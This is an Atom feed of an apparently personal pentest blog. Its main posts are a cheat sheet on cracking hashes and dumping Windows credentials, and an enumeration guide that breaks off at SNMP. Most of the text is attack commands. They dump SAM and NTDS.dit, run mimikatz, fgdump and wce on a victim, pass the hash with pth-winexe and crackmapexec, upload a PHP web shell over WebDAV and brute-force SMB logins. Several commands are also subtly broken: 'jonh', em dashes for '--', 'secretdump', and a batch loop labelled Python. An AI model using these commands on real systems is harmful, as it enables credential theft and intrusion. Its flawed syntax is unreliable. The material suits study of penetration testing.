<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2022-04-21T15:40:16-03:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Thekaiz3n</title><subtitle>Personal website</subtitle><author><name>Thekaiz3n</name></author><entry><title type="html">Memory, part 1 - How the memory work</title><link href="http://localhost:4000/blog/2022/04/21/memory-part1.html" rel="alternate" type="text/html" title="Memory, part 1 - How the memory work" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part1</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part1.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Memory, part 2 - Using memory as a super power</title><link href="http://localhost:4000/blog/2022/04/21/memory-part2.html" rel="alternate" type="text/html" title="Memory, part 2 - Using memory as a super power" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part2</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part2.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Subdomains</title><link href="http://localhost:4000/2022/04/21/subdomains.html" rel="alternate" type="text/html" title="Subdomains" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/2022/04/21/subdomains</id><content type="html" xml:base="http://localhost:4000/2022/04/21/subdomains.html">&lt;p&gt;Teste&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><summary type="html">Teste</summary></entry><entry><title type="html">Hashes and basic criptography</title><link href="http://localhost:4000/cheatsheet/2022/01/14/hashes.html" rel="alternate" type="text/html" title="Hashes and basic criptography" /><published>2022-01-14T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/14/hashes</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/14/hashes.html">&lt;h3 id=&quot;examples&quot;&gt;Examples&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;teste&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;md5sum
&lt;/span&gt;3b16dc694c38d04f7d7451cc37d3c654  -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;teste&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sha256sum 
&lt;/span&gt;a0ec927b1044a5e945fbd9cf4370b4be1bc1ebc93bca51bc37f02a8814196bde  -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;teste.txt
2dc6bdf12b1b886e5e2f3a72f4fb2293  teste.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;one-way-x-two-way&quot;&gt;One way x Two way&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;One way: Hash without reverse, only way to break is brute force&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Two way: Base64 is a example is possible to do the reverse.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hash-lenght&quot;&gt;Hash lenght&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;md5: 32 characters&lt;/li&gt;
  &lt;li&gt;sha1: 40 characters&lt;/li&gt;
  &lt;li&gt;sha256: 64 characters&lt;/li&gt;
  &lt;li&gt;sha512: 128 characters&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;linux&quot;&gt;Linux&lt;/h2&gt;
&lt;h3 id=&quot;indentify-hashes&quot;&gt;Indentify hashes&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hash-identifier 3b16dc694c38d04f7d7451cc37d3c654
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;linux-hashes&quot;&gt;Linux hashes&lt;/h3&gt;
&lt;p&gt;Are in /etc/shadow.&lt;br /&gt;
In this format: $id$salt$encrypted&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;id: Mehtod type: 1 = md5, 5 = sha256, 6 = sha512&lt;/li&gt;
  &lt;li&gt;salt: Random information to help to protect the hash.&lt;/li&gt;
  &lt;li&gt;encypted: Its the hash with salt.
    &lt;ul&gt;
      &lt;li&gt;kali:$y$j9T$GLYvBrczFiXmyft7hxEwX/$ev6ucG67u9pWBLvf7b1WoUTRQMXUDoK5gtuzUOQDU73:18819:0:99999:7::: : Use yescrypt($y$), derivate from originals functions.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;decrypt&quot;&gt;Decrypt&lt;/h3&gt;
&lt;h4 id=&quot;worldlists&quot;&gt;Worldlists&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;/usr/share/wordlists/rockyou.txt&lt;/li&gt;
  &lt;li&gt;/usr/share/john/password.lst&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;john-the-ripper&quot;&gt;John the ripper&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jonh &lt;span class=&quot;nb&quot;&gt;hash 
&lt;/span&gt;jonh —format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Raw-MD5 —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;hashcat&quot;&gt;Hashcat&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 100 &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; /usr/share/john/password.lst —force
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;windows&quot;&gt;Windows&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;SAM  -Security Account manager(Windows)&lt;/strong&gt; : User accounts.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;%SystemRoot%/system32/config/sam&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;NTDS.NIT(Windows server/Active directory)&lt;/strong&gt; : Active directory include users..&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;%SystemRoot%/ntds/ntds.dit&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;SYSTEM&lt;/strong&gt;: System file, use do decrypt sam/ndts.dit&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;%systemroot%/system32/config/system&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hash&quot;&gt;Hash&lt;/h3&gt;
&lt;p&gt;usser:id:LM(LAN MANAGER):NTLM(NT LAM MANAGER)&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ids: 500-adm:501-guest, 1000:helpassistant,1005:user&lt;/li&gt;
  &lt;li&gt;LM: If begin with aa and finish ee (always equal), not used == empty.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;old-windows&quot;&gt;Old Windows&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am samcopy
reg save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem systemcopy


samdump2 samcopy systemcopy &lt;span class=&quot;c&quot;&gt;# Show hashes&lt;/span&gt;

impacket-secretdump &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; samcopy &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; systemcopy LOCAL &lt;span class=&quot;c&quot;&gt;# Better&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;modernactive-directory&quot;&gt;Modern/Active directory&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin create shadow /for&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c:
copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit c:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit
copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;onfig&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem1222

impacket-secretdump &lt;span class=&quot;nt&quot;&gt;-ntds&lt;/span&gt; ntds.dit &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system1222 LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;in-cache&quot;&gt;In cache&lt;/h3&gt;
&lt;p&gt;Meterpreter&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload /usr/share/windows-binaries/fgdump/fgdump.exe &lt;span class=&quot;c&quot;&gt;# Upload do victim&lt;/span&gt;
fgdumpe.exe &lt;span class=&quot;c&quot;&gt;# Execute will create cachedump e pwdump&lt;/span&gt;

upload /usr/share/windows-resources/wce/wce-universal 
wce-universal.exe &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Will get the passwords&lt;/span&gt;

load mimikatz &lt;span class=&quot;c&quot;&gt;# Meterpreter module&lt;/span&gt;
wdigest &lt;span class=&quot;c&quot;&gt;# Cache and more&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin create shadow /for&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c:
copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit c:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;tds.dit
copy &lt;span class=&quot;s2&quot;&gt;&quot;volumecreated&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;onfig&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem1222

impacket-secretdump &lt;span class=&quot;nt&quot;&gt;-ntds&lt;/span&gt; ntds.dit &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system1222 LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;john-the-ripper-1&quot;&gt;John the ripper&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john —format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nt —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashlist —show 
john —format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lm —wordlist&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashlist —show 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;pass-the-hash&quot;&gt;Pass the hash*&lt;/h3&gt;
&lt;p&gt;It’s possible use the hash.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pth-winexe &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; john%&lt;span class=&quot;s2&quot;&gt;&quot;hash&quot;&lt;/span&gt; //172.16.1.60 cmd.exe
exploit/windows/smb/psexec &lt;span class=&quot;c&quot;&gt;#SMB pass the hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="exploitation" /><category term="hashes" /><summary type="html">This is a guide for hashes in linux and windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/hashes.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/hashes.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Exploitation</title><link href="http://localhost:4000/guide/2022/01/13/enumeration.html" rel="alternate" type="text/html" title="Exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/enumeration</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/enumeration.html">&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;h2 id=&quot;brute-force-directorypagesfiles&quot;&gt;Brute force directory/pages/files&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 172.16.1.10/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/big.txt &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;200,301,302,401&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://172.16.1.10/turismo &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/small.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .php,.txt,.sql,.bkp  &lt;span class=&quot;c&quot;&gt;#Search by extensions.&lt;/span&gt;

gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 192.168.0.7 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; wordlist &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .php &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; cookie &lt;span class=&quot;c&quot;&gt;# Pass cookie&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Another tools:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Dirsearch&lt;/li&gt;
  &lt;li&gt;Dirb&lt;/li&gt;
  &lt;li&gt;Dirbusters&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;File extensions to search:
    - Web :.pl,.cgi,.sh,.php,.jsp,.asp,.aspx,.js,.html,.nm
    - Backups:.bkp,.bak,.sql
    - Files:.pdf,.txt,.conf,.xml&lt;/p&gt;

&lt;p&gt;Robots.txt/sitemap.xml are importants file that contains directories that are not indexed.&lt;/p&gt;

&lt;h2 id=&quot;methods-allowed&quot;&gt;Methods allowed&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; OPTIONS http://172.16.1.10/ &lt;span class=&quot;c&quot;&gt;# Will show all methods&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Put method&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; PUT &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_GET[&quot;&lt;/span&gt;cmd&lt;span class=&quot;s2&quot;&gt;&quot;]); ?&amp;gt;&quot;&lt;/span&gt; http://172.16.1.10/webdav/shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ftp&quot;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Commons credentials:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;User:anonymous, pass:anonymous&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;smb&quot;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Permit share directories and files. Port 139 -&amp;gt; NetBIOS, port 445 -&amp;gt; SMB over TCP
Links:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-smb&quot;&gt;Hacktricks SMB&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nbtstat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 172.16.1.4 &lt;span class=&quot;c&quot;&gt;# show name, group, etc...&lt;/span&gt;

net view &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Try to connect&lt;/span&gt;

net view &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; u:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Null session logon&lt;/span&gt;

net use h: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;pt &lt;span class=&quot;c&quot;&gt;# Mount the folder in h:&lt;/span&gt;

nbtstat &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Cache of all old connections&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Python brute force
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; \\&lt;span class=&quot;mf&quot;&gt;172.16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;john&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;linux&quot;&gt;Linux&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nbtscan &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 172.16.1.0/24 &lt;span class=&quot;c&quot;&gt;# Search in range&lt;/span&gt;

smbclient  &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Connect in anonymous mode&lt;/span&gt;

smbclient   //172.16.1.5/_DOCS &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Connect in a directory&lt;/span&gt;

smbclient  &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; —option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client min protocol=NT1&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Sometimes can have a version incompatibility with older versions&lt;/span&gt;

crackmapexec smb 192.168.10.11 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;NTHASH&amp;gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Pass-the-Hash&lt;/span&gt;
crackmapexec smb 192.168.10.11 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Execute cmd&lt;/span&gt;
crackmapexec smb &amp;lt;IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &amp;lt;DOMAIN&amp;gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--sam&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Dump SAM&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Automatic enumeration : &lt;a href=&quot;https://github.com/CiscoCXSecurity/enum4linux&quot;&gt;enum4linux&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enum4linux &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Without users&lt;/span&gt;

enum4linux &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# All&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;rpc-remote-proccedure-call&quot;&gt;RPC Remote proccedure call&lt;/h2&gt;
&lt;p&gt;API to call commands in another machines.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Anonymous login&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# After connect&lt;/span&gt;
enumdomusers &lt;span class=&quot;c&quot;&gt;# Enumerate users&lt;/span&gt;
queryuser jonh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;nfs-network-file-system&quot;&gt;NFS Network file system&lt;/h2&gt;
&lt;p&gt;Protocol to share files. Port 2049&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcinfo &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 172.16.1.5 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;nfs &lt;span class=&quot;c&quot;&gt;# Check versions&lt;/span&gt;

showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Show shared&lt;/span&gt;

mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nfs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;nfsverscat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 172.16.1.5:/ /tmp/nfs &lt;span class=&quot;c&quot;&gt;#Mount the nfs&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;snmp-simple-network-management-protocol&quot;&gt;SNMP Simple Network Management protocol&lt;/h2&gt;
&lt;p&gt;Protocol used to monitor different devices in the network (like routers, switches, printers, IoTs…). Ports: 161,162,10161,10162/UDP
Links:&lt;/p&gt;
&lt;ul&gt;
